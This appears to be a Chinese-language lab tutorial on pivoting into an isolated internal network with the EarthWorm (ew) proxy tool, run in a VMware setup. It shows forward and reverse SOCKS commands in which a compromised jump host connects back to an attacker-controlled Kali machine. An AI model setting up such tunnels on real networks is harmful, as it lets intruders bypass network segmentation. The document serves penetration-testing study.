## ew内网穿透linux

### 环境配置
vps：kali 192.168.6.131
出外网的跳板机：ubuntu01 192.168.6.141；192.168.50.129
不出外网只能与跳板机通讯的内网主机：ubuntu02 192.168.50.128

tips：对于内外网隔离采用了经典的双网卡设置，50网段为vmware的仅主机模式C段，只有同段能访问。

### ew使用方式
ew是一个经典的老工具，可以实现代理和转发，功能强，也很容易被杀。

#### 命令参数
-l  指定要监听的本地端口
-d 指定要反弹到的机器 ip
-e 指定要反弹到的机器端口
-f 指定要主动连接的机器 ip
-g 指定要主动连接的机器端口
-t 指定超时时长,默认为 1000

#### 代理模式
1. 正向代理
```bash
$ ./ew_for_linux64 -s ssocksd -l 1080
```
正向代理直接在跳板机运行，对于攻击者来说，这时的跳板机和SSR的服务器没太大区别。
攻击者使用SSR等代理工具就可以访问内网。

2. 反向代理
公网vps执行
```bash
$ ./ew_for_linux64 -s rcsocks -l 1080 -e 8888 
```


跳板机执行
```bash
$ ./ew_for_linux64 -s rssocks -d vpsip -e 8888 
```

攻击者主机使用vps做ss代理即可访问内网。

### 实战
1. 在ubuntu01上运行`./ew_for_linux64 -s rssocks -d 192.168.6.131 -e 8888 `
![ubunturcsocks](.\ubunturcsocks.png)
2. 在kali上运行`./ew_for_linux64 -s rcsocks -l 1080 -e 8888`
![kalircsocks](.\kalircsocks.png)
3. 在物理机运行sockscaps，设置代理为192.168.6.131:1080
![sockscap](.\sockscap.png)
4. 物理机运行chrome，成功访问ubuntu02主机上的web服务

![穿透成功](.\穿透成功.png)

### 扩展
对于最后一步的配置ss代理，其实在kali上使用工具proxychains就可以完成。

![proxychainsconf](.\proxychainsconf.png)

![proxychainsresult](.\proxychainsresult.png)

